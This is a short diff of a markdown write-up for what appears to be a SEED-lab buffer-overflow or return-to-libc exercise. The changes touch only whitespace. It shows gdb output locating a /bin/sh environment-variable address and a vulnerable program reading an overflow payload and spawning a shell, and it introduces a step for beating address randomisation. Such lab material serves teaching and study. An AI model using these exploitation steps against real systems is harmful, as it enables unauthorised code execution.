@@ -41,9 +41,9 @@ $ export MYSHELL="/bin/sh"
 - $ gdb ./exp
 - (gdb) r
 
---> Starting program: /home/seed/exp 
-  - bffffe8f
-  - [Inferior 1 (process 4738) exited normally]
+--> Starting program: /home/seed/exp  
+    bffffe8f  
+    [Inferior 1 (process 4738) exited normally] 
 
  
 
@@ -55,12 +55,8 @@ $ export MYSHELL="/bin/sh"
 -	(gdb) r
 
 --> Starting program: /home/seed/vul 
-Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏���
+Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏��� 
 $
-
- 
-
- 
 
 8. Now, in order to execute the attack even when the kernel is generating random addresses, use following commands along with commands from steps 1-7
 **Commands:**
